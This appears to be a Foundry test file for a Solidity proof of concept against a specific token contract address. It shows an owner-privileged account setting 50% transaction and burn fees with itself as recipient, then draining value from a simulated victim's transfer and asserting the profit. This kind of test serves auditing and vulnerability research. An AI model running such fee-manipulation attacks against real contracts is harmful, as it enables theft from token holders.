// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICoinToken {
    function updateFee(uint256 _txFee, uint256 _burnFee, address _FeeAddress) external;
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF44DE2b8731cD69d4A727Da0214874aE35559426;
    address attacker = address(this);
    ICoinToken private token;
    address private victim;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ICoinToken(TARGET);
        victim = makeAddr("victim");
        deal(TARGET, victim, 1000 * 1e18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        uint256 attackerInitialBalance = token.balanceOf(attacker);

        // As owner, update the fees to 50% tx fee and 50% burn fee, with the attacker as the fee recipient.
        // Per precondition, attacker is the owner, so no prank is needed.
        token.updateFee(50, 50, attacker);

        // A victim transfers their tokens.
        vm.startPrank(victim);
        uint256 victimBalance = token.balanceOf(victim);
        token.transfer(makeAddr("recipient"), victimBalance);
        vm.stopPrank();

        // Check if the attacker's balance has increased.
        uint256 attackerFinalBalance = token.balanceOf(attacker);
        assertGt(attackerFinalBalance, attackerInitialBalance);
        uint256 finalBalance = IERC20(0xF44DE2b8731cD69d4A727Da0214874aE35559426).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

